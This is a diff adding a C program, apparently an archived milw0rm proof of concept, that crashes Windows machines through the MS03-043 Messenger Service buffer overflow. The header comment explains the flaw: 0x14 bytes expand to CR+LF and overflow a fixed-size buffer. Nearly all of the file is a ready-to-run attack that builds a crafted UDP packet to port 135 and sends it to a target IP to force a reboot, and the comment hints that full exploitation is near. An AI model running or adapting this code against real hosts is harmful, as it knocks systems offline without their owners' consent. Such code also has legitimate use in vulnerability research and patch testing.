@@ -1,0 +1,207 @@
+/* 
+Mon Oct 20 14:26:55 NZDT 2003 
+  
+Re-written By VeNoMouS to be ported to linux, and tidy it up a little. 
+This was only like a 5 minute port but it works and has been tested. 
+venomgen-x.co.nz <mailto:venomgen-x.co.nz> 
+  
+greets to str0ke and defy 
+  
+
+
+DoS Proof of Concept for MS03-043 - exploitation shouldn't be too hard. 
+Launching it one or two times against the target should make the 
+machine reboot. Tested against a Win2K SP4. 
+  
+"The vulnerability results because the Messenger Service does not 
+properly validate the length of a message before passing it to the allocated 
+buffer" according to MS bulletin. Digging into it a bit more, we find that 
+when 
+  
+a character 0x14 in encountered in the 'body' part of the message, it is 
+replaced by a CR+LF. The buffer allocated for this operation is twice the 
+size 
+of the string, which is the way to go, but is then copied to a buffer which 
+was only allocated 11CAh bytes. Thanks to that, we can bypass the length 
+checks 
+  
+and overflow the fixed size buffer. 
+  
+Credits go to LSD :) 
+  
+*/ 
+  
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <string.h> 
+#include <unistd.h> 
+#include <errno.h> 
+#include <time.h> 
+  
+#include <sys/types.h> 
+#include <sys/socket.h> 
+#include <arpa/inet.h> 
+  
+  
+  
+  
+  
+// Packet format found thanks to a bit a sniffing 
+static unsigned char packet_header[] = 
+"\x04\x00\x28\x00" 
+"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
+"\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0" 
+"\x4f\xb6\xe6\xfc" 
+"\xff\xff\xff\xff" // 40 : unique id over 16 bytes ? 
+"\xff\xff\xff\xff" 
+"\xff\xff\xff\xff" 
+"\xff\xff\xff\xff" 
+"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" 
+"\x00\x00\xff\xff\xff\xff" 
+"\xff\xff\xff\xff" // 74 : fields length 
+"\x00\x00"; 
+  
+unsigned char field_header[] = 
+"\xff\xff\xff\xff" // 0 : field length 
+"\x00\x00\x00\x00" 
+"\xff\xff\xff\xff"; // 8 : field length 
+  
+
+
+int usage(char *name) 
+{ 
+ printf("Proof of Concept for Windows Messenger Service Overflow..\n"); 
+ printf("- Originally By Hanabishi Recca - reccamail.ru\n\n 
+<mailto:reccamail.ru\n\n> "); 
+ printf("- Ported to linux by VeNoMouS..\n"); 
+ printf("- venomgen-x.co.nz\n\n\n <mailto:venomgen-x.co.nz\n\n\n> "); 
+  
+ printf("example : %s -d yourputtersux -i 10.33.10.4 -s 
+n0nlameputer\n",name); 
+ printf("\n-d <dest netbios name>\t-i <dest netbios ip>\n"); 
+ printf("-s <src netbios name>\n"); 
+ return 1; 
+} 
+  
+
+
+int main(int argc,char *argv[]) 
+{ 
+        int i, packet_size, fields_size, s; 
+        unsigned char packet[8192]; 
+        struct sockaddr_in addr; 
+  char from[57],machine[57],c; 
+        char body[4096] = "*** MESSAGE ***"; 
+  
+  if(argc <= 2) 
+  { 
+  usage(argv[0]); 
+  exit(0); 
+  } 
+  
+    while ((c = getopt (argc, argv, "d:i:s:h")) != EOF) 
+  switch(c) 
+   { 
+   case 'd': 
+      strncpy(machine,optarg,sizeof(machine)); 
+      printf("Machine is %s\n",machine); 
+      break; 
+   case 'i': 
+            memset(&addr, 0,sizeof(addr)); 
+            addr.sin_family = AF_INET; 
+            addr.sin_addr.s_addr = inet_addr(optarg); 
+            addr.sin_port = htons(135); 
+      break; 
+   case 's': 
+            strncpy(from,optarg,sizeof(from)); 
+      break; 
+  
+   case 'h': 
+      usage(argv[0]); 
+      exit(0); 
+      break; 
+   } 
+       
+        // A few conditions : 
+        // 0 <= strlen(from) + strlen(machine) <= 56 
+        // max fields size 3992 
+  
+  if(!addr.sin_addr.s_addr) { printf("Ummm MOFO we need a dest IP...\n"); 
+exit(0); } 
+  
+        if(!strlen(machine)) { printf("Ummmm we also need the dest netbios 
+name bro...\n"); exit(0); } 
+  
+  if(!strlen(from)) strcpy(from,"tolazytotype"); 
+  
+        memset(packet,0, sizeof(packet)); 
+        packet_size = 0; 
+  
+        memcpy(&packet[packet_size], packet_header, sizeof(packet_header) - 
+1); 
+        packet_size += sizeof(packet_header) - 1; 
+  
+        i = strlen(from) + 1; 
+        *(unsigned int *)(&field_header[0]) = i; 
+        *(unsigned int *)(&field_header[8]) = i; 
+        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
+1); 
+        packet_size += sizeof(field_header) - 1; 
+        strcpy(&packet[packet_size], from); 
+        packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 
+4 
+  
+        i = strlen(machine) + 1; 
+        *(unsigned int *)(&field_header[0]) = i; 
+        *(unsigned int *)(&field_header[8]) = i; 
+        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
+1); 
+        packet_size += sizeof(field_header) - 1; 
+        strcpy(&packet[packet_size], machine); 
+        packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 
+4 
+  
+        fprintf(stdout, "Max 'body' size (incl. terminal NULL char) = %d\n", 
+3992 - packet_size + sizeof(packet_header) - sizeof(field_header)); 
+        memset(body, 0x14, sizeof(body)); 
+        body[3992 - packet_size + sizeof(packet_header) - 
+sizeof(field_header) - 1] = '\0'; 
+  
+        i = strlen(body) + 1; 
+        *(unsigned int *)(&field_header[0]) = i; 
+        *(unsigned int *)(&field_header[8]) = i; 
+        memcpy(&packet[packet_size], field_header, sizeof(field_header) - 
+1); 
+        packet_size += sizeof(field_header) - 1; 
+        strcpy(&packet[packet_size], body); 
+        packet_size += i; 
+  
+        fields_size = packet_size - (sizeof(packet_header) - 1); 
+        *(unsigned int *)(&packet[40]) = time(NULL); 
+        *(unsigned int *)(&packet[74]) = fields_size; 
+  
+        fprintf(stdout, "Total length of strings = %d\nPacket size = 
+%d\nFields size = %d\n", strlen(from) + strlen(machine) + 
+strlen(body),packet_size, fields_size); 
+  
+
+
+ if ((s = socket (AF_INET, SOCK_DGRAM, 0)) == -1 ) 
+  { 
+   perror("Error socket() - "); 
+   exit(0); 
+  } 
+  
+        if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&addr, 
+sizeof(addr)) == -1) 
+  { 
+   perror("Error sendto() - "); 
+   exit(0); 
+  } 
+  
+
+
+        exit(0); 
+}
+
+// milw0rm.com [2004-08-08]
